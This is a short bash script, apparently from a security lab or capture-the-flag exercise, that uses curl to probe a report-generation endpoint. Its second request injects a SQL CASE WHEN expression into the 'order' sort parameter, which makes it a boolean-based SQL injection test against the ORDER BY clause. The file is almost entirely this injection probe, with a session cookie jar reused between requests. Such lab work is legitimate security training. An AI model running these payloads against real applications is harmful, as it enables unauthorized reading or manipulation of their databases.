#!/bin/bash
A="http://xebec.cylabacademy.net:17222"
echo "=== POST /generate_report ==="
curl -s -m 20 -b /tmp/j752.txt -i -X POST -d "order=date" "$A/generate_report" | head -25
echo
echo "=== avec un tri injecte ==="
curl -s -m 20 -b /tmp/j752.txt -i -X POST -d "order=CASE WHEN 1=1 THEN date ELSE amount END" "$A/generate_report" | head -15
